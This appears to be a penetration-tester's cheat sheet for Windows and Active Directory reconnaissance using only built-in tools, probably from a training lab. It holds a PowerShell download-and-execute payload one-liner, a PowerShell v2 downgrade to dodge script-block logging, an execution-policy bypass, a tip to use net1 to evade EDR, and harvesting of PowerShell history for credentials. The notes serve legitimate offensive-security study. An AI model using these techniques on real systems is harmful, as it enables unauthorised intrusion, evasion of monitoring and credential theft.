
## Living Off the Land – Windows AD Cheat Sheet

### Scenario / Mindset

* **No tools**, no internet, managed host.
* Goal: **Use only built-in Windows / AD tooling** for:

  * Host recon
  * Network recon
  * AD / domain recon
  * AV / logging awareness

---

## 1️⃣ Quick Host & Domain Recon (CMD)

**Basics:**

```cmd
hostname                         &:: Hostname
[System.Environment]::OSVersion.Version   &:: OS version (PS)
wmic qfe get Caption,Description,HotFixID,InstalledOn   &:: Patches
ipconfig /all                    &:: NICs, IPs, DNS, DHCP
set                              &:: Environment variables
echo %USERDOMAIN%                &:: Domain name
echo %LOGONSERVER%               &:: DC you talk to
systeminfo                       &:: One-shot host summary
```

---

## 2️⃣ PowerShell Essentials

**Info / config:**

```powershell
Get-Module                        # Loaded modules (AD/Defender/etc.)
Get-ExecutionPolicy -List         # Execution policies
Set-ExecutionPolicy Bypass -Scope Process   # Temp bypass (session only)
Get-ChildItem Env: | ft Key,Value           # Env vars
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
                                   # PowerShell history = possible creds
```

**Download & exec in-memory (if internet allowed):**

```powershell
powershell -nop -c "iex (New-Object Net.WebClient).DownloadString('http://host/payload.ps1')"
```

---

## 3️⃣ PowerShell Downgrade (Logging Evasion)

```powershell
Get-Host                          # See current version (often 5.x)
powershell.exe -version 2         # Start PS v2 (no script-block logging)
Get-Host                          # Confirm Version = 2.0
```

* PS v2 **won’t generate** modern script-block logs.
* The **downgrade command itself is logged**, but later commands in v2 are not.

---

## 4️⃣ Firewall & Defender State

**Firewall:**

```powershell
netsh advfirewall show allprofiles   # Domain / Private / Public profiles
```

**Windows Defender:**

```cmd
sc query windefend                   # Is Defender service running?
```

```powershell
Get-MpComputerStatus                 # AV/AS enabled, sig dates, scan status
```

---

## 5️⃣ Check if You’re Alone

```powershell
qwinsta
```

Look for:

* `console` / `rdp-tcp` and active usernames → don’t pop boxes in their face.

---

## 6️⃣ Network Awareness

**Key commands:**

```powershell
ipconfig /all                # Segment, DNS, gateway
arp -a                       # L2 neighbors, potential lateral targets
route print                  # Known networks & pivot possibilities
netsh advfirewall show allprofiles  # Again: is host filtering?
```

Use `arp -a` + `route print` to:

* See **which subnets exist**
* Identify **other reachable networks** for pivoting.

---

## 7️⃣ WMI One-Liners

```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

* Think: **patch level**, **DCs**, **domain info**, **logged-on / local accounts**, **service accounts**.

---

## 8️⃣ `net` Commands (AD Recon)

> ⚠ Often monitored by EDR. Use **`net1`** instead of `net` if you want to be sneaky.

**Policies & groups:**

```cmd
net accounts /domain                  &:: Domain pw / lockout policy
net group /domain                     &:: Domain groups
net group "Domain Admins" /domain     &:: DA members
net group "Domain Controllers" /domain&:: DCs
net localgroup                        &:: Local groups
net localgroup Administrators         &:: Local admins
net share                             &:: Local shares
```

**Users & hosts:**

```cmd
net user /domain                      &:: All domain users
net user <username> /domain           &:: Info about specific user
net view /domain                      &:: Domain computers
net view                              &:: Computers this host sees
net view \\computer /ALL              &:: Shares on a host
net use X: \\computer\share           &:: Map share
```

Same with `net1`:

```cmd
net1 group /domain
```

---

## 9️⃣ `dsquery` – Native AD Search

Run from a box with AD tools / roles:

**Simple:**

```powershell
dsquery user                           # All users
dsquery computer                       # All computers
```

**Objects in OU:**

```powershell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

**Users with PASSWD_NOTREQD set:**

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" `
  -attr distinguishedName userAccountControl
```

**Domain Controllers (UAC 8192 bit):**

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

> Minimal LDAP filter idea:
> `userAccountControl:1.2.840.113556.1.4.803:=<bitmask>` → match specific UAC flag (e.g. 8192 = DC, 32 = PASSWD_NOTREQD).

---

## 🔟 LOTL Flow in Practice

From a fresh foothold on a Windows box:

1. `systeminfo`, `ipconfig /all`, `whoami`, `hostname`
2. `qwinsta` → make sure you’re alone.
3. `Get-Module`, `Get-MpComputerStatus`, `netsh advfirewall show allprofiles`
4. `arp -a`, `route print` → map reachable networks.
5. WMI (`wmic ntdomain`, `wmic useraccount`, `wmic group`) → domain overview.
6. `net group /domain`, `net user /domain`, `dsquery user/computer` → AD objects.
7. Optional: downgrade to PS v2 for quieter PowerShell work.

